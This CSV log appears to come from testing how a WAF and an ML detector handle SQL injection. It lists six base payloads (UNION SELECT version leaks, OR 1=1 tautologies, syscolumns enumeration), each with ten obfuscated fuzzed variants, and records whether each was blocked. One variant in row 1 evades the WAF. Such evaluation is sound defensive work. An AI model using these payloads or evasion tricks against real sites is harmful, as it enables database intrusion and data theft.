Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2025-10-25T12:54:19.560795, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,403,403,403,both_correct,"/**/sELEcT name fRom syscolumns whEre id   =     (  sElEcT id fROM sysobjects WhEre	name    like    tablename'  )  --",2025-10-25T12:54:36.993745,403,403,both_correct,"/*M\=3w*/SelecT name FrOm/**/syscolumns WHERE id    LIKe      (  sElect id fRom sysobjects WHERE	name	   LIke    tablename'  )  --",2025-10-25T12:54:57.060317,403,403,both_correct,"/*M\=3w*/sELECt name From/*\^/?*/syscolumns WhErE id  /**/ LIkE   
  (  SElect id FRom sysobjects WHErE	name	   like    tablename'  )  --",2025-10-25T12:55:15.165582,403,403,both_correct," seLECT
name From/*\^/?*/syscolumns wheRe id  /**/ lIkE   
  (  sELect id fRoM sysobjects WheRE	name	   like    tablename'  )  --",2025-10-25T12:55:33.691791,403,403,both_correct," seLect
name fROm/*\^/?*/syscolumns wHErE id  /*b!]B^*/ likE 
 
  (  seLEcT id froM sysobjects wHeRE	name	  /**/liKE    tablename'  )  --",2025-10-25T12:55:50.876320,403,403,both_correct," SELEcT
name froM/*\^/?*/syscolumns wheRe id  /*1qD*/ LIke 
/**/
  (  seLeCt id from sysobjects WHere name	  /**/liKE    tablename'  )  --",2025-10-25T12:56:09.376954,403,403,both_correct," SELECT
name FRoM/*\^/?*/syscolumns WHEre id  /*1qD*/ like 	/*YB*/
  (  SELECT id frOm sysobjects WhERE name	   LIkE    tablename'  )  --",2025-10-25T12:56:27.307467,403,403,both_correct," SeLECt
name FROm/*\^/?*/syscolumns WHERe id  /*1qD*/ lIkE 	/**/
  (  SElEct id/**/FrOM sysobjects wheRE name    lIKe    tablename'  )  --",2025-10-25T12:56:45.614460,403,403,both_correct," seleCt
name FrOm/*\^/?*/syscolumns Where id  /*1qD*/ lIkE  /**/
  (  SeleCt id/**/FrOm sysobjects/**/wHErE name    LIke    tablename'  )  --",2025-10-25T12:57:04.135766,403,403,both_correct," seLecT
name froM/*\^/?*/syscolumns WHERe id  /*1qD*/ liKe  /**/	  (  SeLEcT id fRoM sysobjects/*q\$~ OR '9w)' LIKE '9w)'*/whERe name    lIkE    tablename'  )  --",2025-10-25T12:57:22.609589,200,403,waf_incorrect_ml_correct
2,2025-10-25T12:57:40.709972," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",403,403,403,both_correct," seleCT * from users WhEre id  =  1 ||
1#"". union SeLect 'a',version  (  /**/ )   --  AND (SELECT '.Qe'='.Qe')",2025-10-25T12:57:57.637917,403,403,both_correct," SEleCt * FrOm users whERE id /**/=  ')Xdx' not like ')XdxO' || 0x1#"". union SELEct 'a',version  (  /**/ )   --  AND (SELECT '.Qe'='.Qe').",2025-10-25T12:58:17.658791,403,403,both_correct," SELeCT * FROm users WhErE id /**/ lIke 
 ')Xdx' not like ')XdxO' || 0x1#"". union SElecT 'a',version  (    )   --  AND (SELECT '.Qe'='.Qe').{W",2025-10-25T12:58:36.154763,403,403,both_correct," SElecT * frOM users WHeRe id /**/	like/**/
 ')Xdx' not like ')XdxO' || 0x1#"". union SeLeCt 'a',version  (    )   --  AND (SELECT '.Qe'='.Qe').{Wa",2025-10-25T12:58:54.623218,403,403,both_correct," SelEcT * FRom users whErE id /**/	LiKE/**/
 ')Xdx' not like ')XdxO'  OR  0x1#"". union SelEct 'a',version  (    )  
--/**/ AND (SELECT '.Qe'='.Qe').{WaP",2025-10-25T12:59:12.171954,403,403,both_correct," sElECT * fROM users WherE id  	like/**/	 ')Xdx' not like ')XdxO'  or  0x1#"". union SeleCt 'a',version  (    )  
--/**/ AND (SELECT '.Qe'='.Qe').{WaPo%",2025-10-25T12:59:31.803909,403,403,both_correct," sELect * FROM users wHere id   LIkE 	 ')Xdx' not like ')XdxO'  oR  0x1#"". union sELECt 'a',version  (    )  
--/**/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T12:59:49.719636,403,403,both_correct," SElECt * FROm users WherE id   LIKe 	 ')Xdx' not like ')XdxO'  OR  0x1#"". union sEleCT 'a',version /**/(    )   --/*^kBP*/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T13:00:07.464181,403,403,both_correct," SELEct * From users WhEre id/**/  liKe 
 ')Xdx' not like ')XdxO'  ||  0x1#"". union seLEct 'a',version /*zY*/(    )   --/**/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T13:00:26.062949,403,403,both_correct," selEcT * FrOm users WHERE id/**/  LIkE 
 ')Xdx' not like	')XdxO'   OR/**/  0x1#"". union Select 'a',version /*z+*/(    )   --/**/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T13:00:44.106038,403,403,both_correct
3,2025-10-25T13:01:01.673955," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",403,403,403,both_correct," SELeCT * FROm users wHERE id   like   '3464 NOT LIKE 3465' union SeleCt /*kBc*/ (  \  )  ,@@VERSION -- (SELECT
 AND 1)'",2025-10-25T13:01:18.229617,403,403,both_correct," sELect * frOM users WheRe id  /**/lIke   '3764=(SELECT 3764) NOT LIKE 3465' union SEleCT /**/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT 1))'[k",2025-10-25T13:01:37.449498,403,403,both_correct," SElect * from users WhERe id   liKe   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 3764)
NOT LIKE 0xd89' union SELeCt /*Em*/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT  OR 0))'[k",2025-10-25T13:01:57.478656,403,403,both_correct," sEleCt *
fROm/**/users wHEre id   lIKE   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union sElECt /**/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT  OR  AND 4255<>4256))'[k",2025-10-25T13:02:16.810677,403,403,both_correct," SELEcT *
from/**/users WheRE id   liKe   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union SelECt /*%ujI*/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT /**/OR  AND 
And 1<>(SELect '""]r' NOT LIKE '""]r""')))'[k",2025-10-25T13:02:35.342273,403,403,both_correct," selecT * from/**/users wHere id   lIkE   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union SELecT /*%ujI*/ (  \  ) /**/,@@VERSION -- (SELECT  ANd (SELECT /**/OR  AND 
aNd  or ',F'!=',Fe'<>(SElEcT '""]r' NOT LIKE '""]r""')))'[k*",2025-10-25T13:02:52.918109,403,403,both_correct," selECT * fRom/*<lo*/users WHErE id   liKE   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union sEleCt /*%ujI*/ (  \  ) /**/,@@VERSION -- (SELECT/**/ ANd (SELECT /**/OR  AND	
And  OR ',F'!=',Fe' NOT LIKE (sELEct '""]r' NOT LIKE '""]r""')))'[k*",2025-10-25T13:03:11.509091,403,403,both_correct," select * FROM users wHERE id   likE   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union SElECT /*%ujI*/ (  \  ) /**/,@@VERSION -- (SELECT/**/ ANd (SELECT /**/OR  AND 
AND  || ',F'!=',Fe' NOT LIKE (SeLect '""]r' NOT LIKE '""]r""')))'[k*Ds",2025-10-25T13:03:29.131734,403,403,both_correct," SeLEcT * FROm users whErE id   liKE   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union sElEct /*%ujI*/ (/**/ \  ) /*n-L/*/,@@VERSION -- (SELECT/**/ ANd (SELECT /**/OR  AND 
AnD 	 OR  ',F'!=',Fe' NOT LIKE (seLECT '""]r' NOT LIKE '""]r""')))'[k*Ds",2025-10-25T13:03:47.465690,403,403,both_correct," SElEct * fROm users WheRe id   lIke   ''} 
o9' NOT LIKE '} 
o9Z'=(SELECT 0xeb4)
NOT LIKE 0xd89' union select /**/ (/**/ \  ) /*n-L/*/,@@VERSION -- (SELECT/**/ ANd (SELECT  OR  AND 
AND   OR  ',F'!=',Fe' not like (sELECT '""]r' NOT LIKE '""]r""')))'[k*Dshm",2025-10-25T13:04:06.467712,403,403,both_correct
4,2025-10-25T13:04:25.377909,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,403,403,403,both_correct,"SElect * FrOM users WHERE id   LIKE   '(SELECT 0)' NOT LIKE '0N' <@.$ OR 1  =/**/ 1 --  OR	0=t",2025-10-25T13:04:42.162345,403,403,both_correct,"sELecT * frOm users Where id   lIke   '(SELECT 9829 IN (9828,9829,9830))' NOT LIKE '0N' <@.$ or/**/0x1  =/*VTDb*/  Or 0 --  OR
0=t",2025-10-25T13:05:01.793034,403,403,both_correct,"selECt * FROM users WhERE id   liKE   '(SELECT 'E' NOT LIKE 'E<'
IN (0x2664,9829,9830))' NOT LIKE '0N' <@.$ Or 0x1   LIKE /*;]<**/  or 0 --  OR
 OR 0=t",2025-10-25T13:05:19.174385,403,403,both_correct,"selECt * fRoM users WHEre id   liKe   '(SELECT 'E' NOT LIKE 'E<'
IN (0x2664,(SELECT 9829),9830))' NOT LIKE '0N' <@.$ or 0x1   LIke /*;]<**//**/ oR  aNd 1 --  OR	 OR 6276<>6277=t",2025-10-25T13:05:36.954332,403,403,both_correct,"SelecT * fROm/**/users wHere id   lIKE   '(SELECT 'E' NOT LIKE 'E<'
IN (0x2664,(SELECT 9829),9830))' NOT LIKE '0N' <@.$ or 0x1   like /*;]<**//**/ Or  anD 0x1 --  OR  OR (SELECT 1)<>'t'='t'=t",2025-10-25T13:05:54.428487,403,403,both_correct,"sElEct * fRom/**/users/**/WhErE id   lIkE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT 4845 LIKE 4845),0x2666))' not like '0N' <@.$ OR 0x1   Like /*;]<**//**/ Or  aNd 0x1 --  OR  OR (SELECT  AND 1)<>'t'='t'=tc$",2025-10-25T13:06:12.371553,403,403,both_correct,"SeLecT * FRoM/**/users/**/WhErE id   likE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X' NOT/**/LIKE 'X[') LIKE (SELECT 1)),0x2666))' not like '0N' <@.$ Or 0x1
  LIKe /*;]<**//**/ Or  And 0x1 --  OR  OR (SELECT  AND 1)<>'t'='t'=tc$4",2025-10-25T13:06:29.842315,403,403,both_correct,"SElEcT * FRom/**/users/**/whERE id   LIKE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X'	NOT/**/LIKE 'X[') LIKE (SELECT 0x1)),0x2666))' not like '0N' <@.$ oR 0x1
  LiKe /*;]<**//**//**/OR  anD 0x1 --  OR  OR (SELECT  AND  AND '3P'='3P')<>'t'='t'=tc$4jT",2025-10-25T13:06:47.519888,403,403,both_correct,"seLECt * froM/**/users/**/wHEre id
  LikE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X'	NOT/**/LIKE 'X[')/**/LIKE (SELECT 0x1)),0x2666))' not like '0N' <@.$ oR 0x1
  LIKe /*;]<**//**//**/or  && 0x1 --  OR  OR (SELECT  AND  AND '3P'='3P')<> OR '(f)' NOT LIKE '(f)H'=tc$4jT0",2025-10-25T13:07:05.942037,403,403,both_correct,"SelECT * from/**/users/**/WHerE id
  like   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X'	NOT/**/LIKE 'X[')/**/LIKE (SELECT 0x1)),0x2666))' not like '0N' <@.$ or 0x1   lIkE /*;]<**//**//**/OR   anD  0x1 --  OR  OR (SELECT  AND/**/ AND '3P'='3P')<> OR '(f)' NOT LIKE '(f)H'=tc$4jT0Q",2025-10-25T13:07:23.754854,403,403,both_correct
5,2025-10-25T13:07:41.680512," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",403,403,403,both_correct," SELEcT * fRom users WHERe id   lIke   '(SELECT 1)' oR @ @1/**/ =  1 union SelECt 0x7ee LIKE 2030,version 
(    )   -- 1'",2025-10-25T13:07:58.874352,403,403,both_correct," sElEcT * FROM users wheRe id   LIKE   '(SELECT 1)' OR @ @0x1466 In (5221,5222,5223)   lIkE   1 union SeleCt 0x7ee Like 2030,version 	(    )   --  OR 0'Po",2025-10-25T13:08:19.872371,403,403,both_correct," SElecT * fROM users whERE id   Like   '(SELECT 1)' or @ @0x1466 iN (5221,'I'='I',(SELECT 5223))   lIKE   1 union SElEct 0x7ee LikE (SELeCt 1),version  (    )   -- /**/OR 0'Po",2025-10-25T13:08:41.091853,403,403,both_correct," SEleCt * fRom users wHERe id   LIkE   '(SELECT (SELECT 1))' OR @ @0x1466 iN (5221,'I'='I',(seleCt 5223))   likE   7430 Like 7430 union SeLEcT 0x7ee LIke (SelEct 1),version  (  	 )   --  OR (SELECT 0)'Pol",2025-10-25T13:09:04.124262,403,403,both_correct," seleCT * FROM users WHeRE id   lIKE   '(SELECT (SELECT 1))'
|| @ @0x1466 IN (0x1465,'I'='I',(seLeCt 5223))   lIke   4260!=4261 LiKe  OR 0 union sELEct 0x7ee LIke (sELecT 1),version  (/**/ 	 )   --  OR (SELECT 0)'Pol'",2025-10-25T13:09:24.661337,403,403,both_correct," SELEct * FRom users WHEre id   lIkE   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'	|| @ @0x1466 iN (0x1465,'I' like 'I',(SEleCT 5223))   LiKE   4260!=4261 LIKE  Or 0 union sELECT 0x7ee LiKE (sELect 1),version  (  	 )   --  OR (SELECT 0)'Pol'",2025-10-25T13:09:45.317954,403,403,both_correct," SELeCt * FrOM users WhErE id   liKe   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'	 or  @ @0x1466 IN (0x1465,'I' LikE 'I',(SElECt (SELECT 5223)))   liKE   (SELECT 1)!=4261 LiKE  or 0 union sElecT 0x7ee/* DP*/lIkE (SElEct 'D' NOT LIKE 'D:'),version  (  	 )  	--  OR (SELECT 0)'Pol'",2025-10-25T13:10:04.708335,403,403,both_correct," SELECt * FroM users wherE id   likE   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'  oR  @ @0x1466 In (0x1465,'I' LIke 'I',(seLECt (selecT (SELECt 5223))))   Like   (SELEcT 1)!=4261 lIKE  OR 2322 in/**/(2321,2322,2323) union SelEct 0x7ee/**/lIKe (SeLeCt 'D' not like 'D:'),version  (  	 )  	--  OR (SELECT  OR 0)'Pol' ",2025-10-25T13:10:22.297530,403,403,both_correct," seLect * From users WhERE id   like   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'  Or  @ @0x1466 iN (0x1465,'I' LIke 'I',(SeLeCt (SElect (sElECt  Or 0))))   LIke   (SeleCT 1)!=4261 liKE  OR 2322 In/**/(141 not like 142,(SeLEcT 2322),2323) union SELEcT 0x7ee Like (SELecT 'D' not like 'D:'),version  (    )  	--  OR (SELECT  OR 0)'Pol' #$",2025-10-25T13:10:40.106321,403,403,both_correct," SELeCt * FRoM users WhEre id   LiKE   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'  or/**/ @ @0x1466 In (0x1465,'I' LikE 'I',(seLecT (SeLECT (SEleCT  or 0))))   lIke   (selECT 1)!= Or 0 LiKe  or 'YXe'I'<>'YXe'Ip' In/**/(141 not like 0x8e,(SElECT 2322),2323) union select 0x7ee lIKe (sELeCT 'D' not like 'D:'),version  (    )   --  OR (SELECT  OR 0)'Pol' #$",2025-10-25T13:10:57.617083,403,403,both_correct
6,2025-10-25T13:11:15.255759,select * from users where id  =  1. <@ or 1  =  1 -- 1,403,403,403,both_correct,"sELect * FRoM users wHERE id  =   OR 6390 NOT LIKE 6391. <@ || (SELECT 1)	 =  1 --/*`*/1",2025-10-25T13:11:32.946167,403,403,both_correct,"selEct * FRoM users WheRe id  =  
Or  oR 0 NOT LIKE 6391. <@  Or  (SelecT 6532<>6533)	 =  (SeLeCT 1) -- 1",2025-10-25T13:11:52.468111,403,403,both_correct,"SelEcT * frOm users wHErE id  =  
OR  oR 0 NOT LIKE 6391. <@  OR  (seLEcT 6532<>8524 In ( oR 0,0x214c,8525))
  LIKE   (SELect/**/1) -- 1",2025-10-25T13:12:10.266748,403,403,both_correct,"seLEcT * fROm users wHere id/**/ =  
oR  or (sEleCt 1) NOT LIKE (SelecT 6391). <@  ||  (seLEcT ' w' NOT LIKE	' w%'<>8524 iN ( Or 0,0x214c,8525))
  LIKE   (SeLEct/*IGCv*/1) -- 1",2025-10-25T13:12:28.698376,403,403,both_correct,"SeLEcT * froM users WHEre id  =  
oR  oR (seLeCt 1) not like (seLeCt  OR '}d'='}d'). <@  ||  (SeLECT ' w' NOT LIKE
' w%'<>8524 IN ( oR 0,0x214c,8525))
  lIKe   (SELeCT/**/1) -- (SELECT 1)+",2025-10-25T13:12:47.621196,403,403,both_correct,"SeLect */**/frOm users wheRE id  =  
Or  or (sElecT 1) not like (SELeCt  Or '}d'='}d'). <@  ||  (SEleCT ' w' NOT LIKE	' w%'!=8524 IN ( oR 0,0x214c,(selECt 1)))
  lIKE   (sEleCT/*#pYm;*/1) -- (SELECT (SELECT '+' LIKE '+'))+",2025-10-25T13:13:05.002008,403,403,both_correct,"sELeCT */**/fROM users WHeRe id   like    Or  oR (SEleCt 'j~' LIKE 'j~') not like (sELEct  oR '}d'='}d'). <@  ||  (SeLeCt ' w' NOT LIKE	' w%'!= AND 1 iN/**/( OR 0,0x214c,(selECT 0x1)))
  LIKE   (sELECt/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H",2025-10-25T13:13:23.203492,403,403,both_correct,"sELect */*>iW!*/fRoM users whErE id   lIKe    Or  Or (sElEcT 'j~'/**/LIKE 'j~') not like (SELecT  or '}d'='}d'). <@  ||  (SelEct ' w' NOT LIKE ' w%'!= && 1 In/**/( or 9274 in (9273, oR (SelECt 0),9275),0x214c,(SelECT 0x1)))
  LIKe   (seLeCt/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H",2025-10-25T13:13:40.961553,403,403,both_correct,"seLEct */*>iW!*/fROm users WHeRe id   lIke    oR
 OR (SelECT 'j~'/**/LiKe 'j~') not like (sELECT  or '}d'='}d'). <@  ||  (SeLEcT ' w' NOT LIKE ' w%'!=  AND  '0' NOT LIKE '0_' iN/**/( oR 9274 in (9273, or/**/(seLeCt 0x0), oR 0),0x214c,(seLECT 0x1)))
  lIkE   (sELeCt/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H4Z",2025-10-25T13:13:58.508317,403,403,both_correct,"SELeCT */*>iW!*/froM users wheRE id   liKE    or
 OR (seLEct 'j~'/**/LIKe 'j~') not like (sELect  OR '}d'='}d'). <@  ||  (sElect ' w' NOT LIKE ' w%'!=  aND  '0' NOT LIKE '0_' In/**/( OR 4555 NOT LIKE (SELECT (SELECT 1)) in (9273, or/**/(sELeCt 0x0), oR 0),0x214c,(SelECT 0x1)))	 /**/lIke   (seLECT/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H4Za",2025-10-25T13:14:15.635989,403,403,both_correct
